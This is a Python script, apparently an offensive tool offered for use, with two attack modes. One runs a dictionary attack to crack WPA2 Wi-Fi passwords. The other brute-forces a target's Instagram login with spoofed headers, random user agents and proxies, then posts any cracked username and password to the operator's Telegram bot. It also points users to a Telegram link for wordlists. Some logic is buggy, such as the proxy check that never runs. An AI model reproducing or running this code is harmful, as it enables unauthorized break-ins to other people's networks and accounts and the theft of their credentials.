try:
    import requests, random, os, time, platform
    from user_agent import generate_user_agent
    from ast import Pass 
    from pywifi import *
except ModuleNotFoundError:
    os.system("pip install requests user_agent pywifi")
    
    os.system("clear")

Black = "\033[1;30m"
Red = "\033[1;31m"
Green = "\033[1;32m"
Yellow = "\033[1;33m"
Blue = "\033[1;34m"
Purple = "\033[1;35m"
Cyan = "\033[1;36m"
White = "\033[1;37m"
Gray = "\033[1;39m"
DarkRed = "\033[2;31m"
DarkBlue = "\033[2;34m"
DarkPink = "\033[2;35m"
DarkCyan = "\033[2;36m"

print("""\033[1;35m
            ___----------___
         _--                ----__
        -                         ---_
       -___    ____---_              --_
   __---_ .-_--   _ O _-                -
  -      -_-       ---                   -
 -   __---------___                       -
 - _----                                  -
  -     -_                                 _
  `      _-                                 _
        _                           _-_  _-_ _
       _-                   ____    -_  -   --
       -   _-__   _    __---    -------       -
      _- _-   -_-- -_--                        _
      -_-                                       _
     _-                \033[1;37mv0.1.2\033[1;35m                    _

\n\033[1;37mTHIS TOOL WAS PROGRAMMED BY TLER AL-SHAHRANI.\nPERSONAL WEBSITE : \033[1;34mhttps://tlersa.github.io/tleralshahrani/Index.html""")
print("\033[1;37m- "*35)

def main_menu():
    print("""\033[1;37m[\033[1;35m1\033[1;37m] - Wi-Fi
\033[1;37m[\033[1;35m2\033[1;37m] - Instagram
[\033[1;35m99\033[1;37m] - Exit""")

def handle_selection(selection):
    if selection == "1" or selection == "Wi-Fi" or selection == "WI-FI" or selection == "wi-fi":
        def check_os():
            os_name = platform.system()

            if os_name == "Linux":
                def linux_wifi(ssid, password, interface):
                    linux_wifi = pywifi.PyWiFi()
                    INF = linux_wifi.interfaces()[interface]
                    INF.disconnect()
                    time.sleep(1)

                    profile = pywifi.Profile()
                    profile.ssid = ssid
                    profile.auth = const.AUTH_ALG_OPEN
                    profile.akm.append(const.AKM_TYPE_WPA2PSK)
                    profile.cipher = const.CIPHER_TYPE_CCMP
                    profile.key = password

                    INF.remove_all_network_profiles()
                    tmp_profile = INF.add_network_profile(profile)

                    INF.connect(tmp_profile)
                    time.sleep(5)

                    if INF.status() == const.IFACE_CONNECTED:
                        print(f"[\033[1;32m✓\033[1;37m] Pass : \033[1;35m{password}")
                        return True
                    else:
                        print(f"""\033[1;37m[\033[1;31m✕\033[1;37m] Pass \033[1;35m{password} \033[1;37mis False!""")
                        return False

                ssid = input("\033[1;37m[\033[1;35m+\033[1;37m] Entet the SSID (Wi-Fi name) : \033[1;35m")
                passwords = input("""\033[1;37m[\033[1;35m+\033[1;37m] Enter the name of the passwords file
    \033[1;33m(if u don't have it, do one of these things :
    \033[1;37m• \033[1;33mDownload it to your device from https://t.me/tler_sa/80
    \033[1;37m• \033[1;33mSearch for these files on the internet and download them to your device
    \033[1;37m• \033[1;33mCreate a file using the Crunch tool)
\033[1;37m: \033[1;35m""")
                interface = int(input("""\033[1;37m[\033[1;35m+\033[1;37m] Enter the interface num (\033[1;32mex\033[1;37m: \033[1;32m0 \033[1;37mfor \033[1;32mwlan0\033[1;37m) 
    \033[1;33m(if u don't know what the interface num is :
    \033[1;37m• \033[1;33mType the command "iwconfig" in the terminal)
\033[1;37m: \033[1;35m"""))

                try:
                    with open(passwords, "r") as file:
                        for password in file.readlines():
                            password = password.strip()
                            if linux_wifi(ssid, password, interface): break
                except FileNotFoundError: print(f"\033[1;31mFile \033[1;35m{passwords}\033[1;31m not found!\033[1;37m")
            else:
                try:
                    wifi = PyWiFi()
                    INF = wifi.interfaces()[0]
                    INF.scan()
                    Rscan = INF.scan_results()
                except: print("\033[1;31mWi-Fi not found!\033[1;37m")

                def wifi(ssid, password):
                    prof = Profile()
                    prof.ssid = ssid
                    prof.auth = const.AUTH_ALG_OPEN
                    prof.akm.append(const.AKM_TYPE_WPA2PSK)
                    prof.cipher = const.CIPHER_TYPE_CCMP
                    prof.key = password
                    INF.remove_all_network_profiles()
                    TEMP_PROF = INF.add_network_profile(prof)
                    INF.connect(TEMP_PROF)

                    time.sleep(0.5)

                    if INF.status() == const.IFACE_CONNECTED:
                        print(f"\033[1;37m[\033[1;32m✓\033[1;37m] Pass : \033[1;35m{password}")
                        return True
                    else: 
                        print(f"""\033[1;37m[\033[1;31m✕\033[1;37m] Pass \033[1;35m{password} \033[1;37mis False!""")
                        return False

                ssid = input("\033[1;37m[\033[1;35m+\033[1;37m] Entet the SSID (Wi-Fi name) : \033[1;35m")
                passwords = input("""\033[1;37m[\033[1;35m+\033[1;37m] Enter the name of the passwords file
    \033[1;33m(if u don't have it, do one of these things :
    \033[1;37m• \033[1;33mDownload it to your device from https://t.me/tler_sa/80
    \033[1;37m• \033[1;33mSearch for these files on the internet and download them to your device
    \033[1;37m• \033[1;33mCreate a file using the Crunch tool)
\033[1;37m: \033[1;35m""")

                try:
                    filee = open(passwords, "r")
                    for Pass in filee.readlines():
                        Pass = Pass.strip()
                        if wifi(ssid, Pass): break
                except: print(f"\033[1;31mFile \033[1;35m{passwords}\033[1;31m not found!\033[1;37m")
                
                another_operation = input("\033[1;37mWould you like another operation? (\033[1;35mY\033[1;37m/\033[1;35mN\033[1;37m) \033[1;35m")
                if another_operation == "Y" or another_operation == "y" or another_operation == "Yes" or another_operation == "yes" or another_operation == "YES": main_menu()
                elif another_operation == "N" or another_operation == "n" or another_operation == "No" or another_operation == "no" or another_operation == "No": exit("\033[1;37m")
        check_os()

    elif selection == "2" or selection == "Instagram" or selection == "instagram" or selection == "INSTAGRAM":
        send_tele = input("\033[1;37m[\033[1;35m+\033[1;37m] Do you want to send info to the Telegram? \033[1;37m(\033[1;33mY\033[1;37m/\033[1;33mN\033[1;37m) \033[1;33m")
        if send_tele == "Y" or send_tele == "y" or send_tele == "Yes" or send_tele == "yes":
            ID = input("\033[1;37m[\033[1;35m1\033[1;37m] Enter your Telegram ID \033[1;37m: \033[1;35m")
            token = input("\033[1;37m[\033[1;35m2\033[1;37m] Enter your Telegram bot token \033[1;37m: \033[1;35m")
        elif send_tele == "N" or send_tele == "n" or send_tele == "No" or send_tele == "no": None
        else: print("\033[1;31mPlease choose \033[1;37m(\033[1;33mY\033[1;37m/\033[1;33mN\033[1;37m)!")

        r = requests.Session()

        filee = input("""\033[1;37m[\033[1;35m+\033[1;37m] Enter the name of the passwords file
    \033[1;33m(if u don't have it, do one of these things :
    \033[1;37m• \033[1;33mDownload it to your device from https://t.me/tler_sa/80
    \033[1;37m• \033[1;33mSearch for these files on the internet and download them to your device
    \033[1;37m• \033[1;33mCreate a file using the Crunch tool)
\033[1;37m: \033[1;35m""")
        rfile = open(filee, "r")

        def get_proxies():
            proxies = []
            proxy_file = input("\033[1;37m[\033[1;35m+\033[1;37m] If you have a proxies file, please enter its name \033[1;37m: \033[1;35m")

            if proxy_file == True:
                try:
                    with open(proxy_file, 'r') as f: proxies = [line.strip() for line in f]
                except FileNotFoundError: print("\033[1;31mUnfortunately, the file was not found. It will continue without proxies")
                return proxies

            elif proxy_file == "": None

        def make_request(url, proxies):
            if proxies:
                for proxy in proxies:
                    try:
                        response = requests.get(url, proxies={"http": proxy, "https": proxy})
                        return response
                    except requests.exceptions.RequestException: print(f"\033[1;31mThis proxy {proxy} has not been connected, the following will be tried...")
            else:
                response = requests.get(url)
                return response

        proxies = get_proxies()
        response = make_request('https://www.instagram.com/accounts/login/ajax/', proxies)

        us = input("\033[1;37m[\033[1;35m+\033[1;37m] Enter username target : \033[1;35m@")

        while True:
            username = us
            password = rfile.readline().split("\n")[0]

            url = 'https://www.instagram.com/accounts/login/ajax/'
            
            headers = {'accept':'*/*',
                'accept-encoding':'gzip,deflate,br',
                'accept-language':'en-US,en;q=0.9,ar;q=0.8',
                'content-length':'269',
                'content-type':'application/x-www-form-urlencoded',
                'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
                'origin':'https://www.instagram.com',
                'referer':'https://www.instagram.com/',
                'sec-fetch-dest':'empty',
                'sec-fetch-mode':'cors',
                'sec-fetch-site':'same-origin',
                'user-agent': generate_user_agent(),
                'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
                'x-ig-app-id':'936619743392459',
                'x-ig-www-claim':'0',
                'x-instagram-ajax':'8a8118fa7d40',
                'x-requested-with':'XMLHttpRequest'}
                    
            data = {
                'username': username,
                'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
                'queryParams':'{}',
                'optIntoOneTap':'false'}

            req_login = r.post(url, headers=headers, data=data, proxies=None)

            if "userId" in req_login.text:
                print(f"\033[1;37m[\033[1;32m✓\033[1;37m] Pass : \033[1;35m{password}\033[1;37mis True!")
                tlg = (f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={username}{password}")
                i = requests.post(tlg)
                break

            else: print(f"\033[1;37m[\033[1;31m✕\033[1;37m] Pass \033[1;35m{password} \033[1;37mis False!")

        another_operation = input("\033[1;37mWould you like another operation? (\033[1;35mY\033[1;37m/\033[1;35mN\033[1;37m) \033[1;35m")
        if another_operation == "Y" or another_operation == "y" or another_operation == "Yes" or another_operation == "yes" or another_operation == "YES": main_menu()
        elif another_operation == "N" or another_operation == "n" or another_operation == "No" or another_operation == "no" or another_operation == "No": exit("\033[1;37m")
    elif selection == "99" or selection == "EXIT" or selection == "exit": exit("\033[1;37m")
    else: print("\033[1;31mPlease choose a valid option!")

def main():
    main_menu()

    while True:
        user_input = input("\033[1;37mChoose : \033[1;35m")
        handle_selection(user_input)

if __name__ == "__main__": main()
